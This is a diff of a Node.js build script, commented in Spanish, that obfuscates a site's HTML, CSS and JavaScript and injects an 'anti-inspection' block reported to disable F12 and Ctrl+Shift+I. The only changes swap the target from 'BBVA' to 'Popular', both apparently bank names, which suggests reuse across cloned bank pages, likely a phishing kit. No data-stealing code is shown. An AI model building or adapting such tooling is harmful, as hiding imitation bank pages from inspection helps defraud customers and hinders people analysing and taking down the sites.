@@ -1,5 +1,5 @@
 /* ============================================
-   OFUSCAR BBVA + ANTI-INSPECCIÓN
+   OFUSCAR POPULAR + ANTI-INSPECCIÓN
    Ofusca HTML + CSS + JS y agrega anti-inspección
    ============================================ */
 
@@ -12,7 +12,7 @@ const CleanCSS = require('clean-css');
 // ============================================
 // CONFIGURACIÓN
 // ============================================
-const CARPETA = path.join(__dirname, 'bbva-build');
+const CARPETA = path.join(__dirname, 'popular-build');
 
 // Configuración del ofuscador JS
 const CONFIG_JS = {
@@ -108,7 +108,7 @@ async function minificarHTML(archivo) {
         let codigo = fs.readFileSync(ruta, 'utf8');
 
         // 1. Insertar anti-inspección antes de </body> si no existe
-        // BBVA ya usa _0x22 / contextmenu — checamos ambos
+        // Popular ya usa _0x22 / contextmenu — checamos ambos
         if (codigo.indexOf('_0xa1=0') === -1 && codigo.indexOf('_0xeia') === -1) {
             if (codigo.indexOf('</body>') !== -1) {
                 codigo = codigo.replace('</body>', BLOQUE_ANTI + '</body>');
@@ -156,7 +156,7 @@ function minificarCSS(archivo) {
 // EJECUTAR
 // ============================================
 async function main() {
-    console.log('\n🔒 OFUSCANDO BBVA + ANTI-INSPECCIÓN\n');
+    console.log('\n🔒 OFUSCANDO POPULAR + ANTI-INSPECCIÓN\n');
 
     // Minificar HTML + insertar anti-inspección
     console.log('📄 Minificando HTML + agregando anti-inspección:');
@@ -168,7 +168,7 @@ async function main() {
     console.log('\n📄 Minificando CSS:');
     minificarCSS('styles.css');
 
-    console.log('\n✅ BBVA OFUSCADO + PROTEGIDO CORRECTAMENTE\n');
+    console.log('\n✅ POPULAR OFUSCADO + PROTEGIDO CORRECTAMENTE\n');
     console.log('🔒 Anti-inspección activado:');
     console.log('   ❌ F12 bloqueado');
     console.log('   ❌ Ctrl+Shift+I bloqueado');
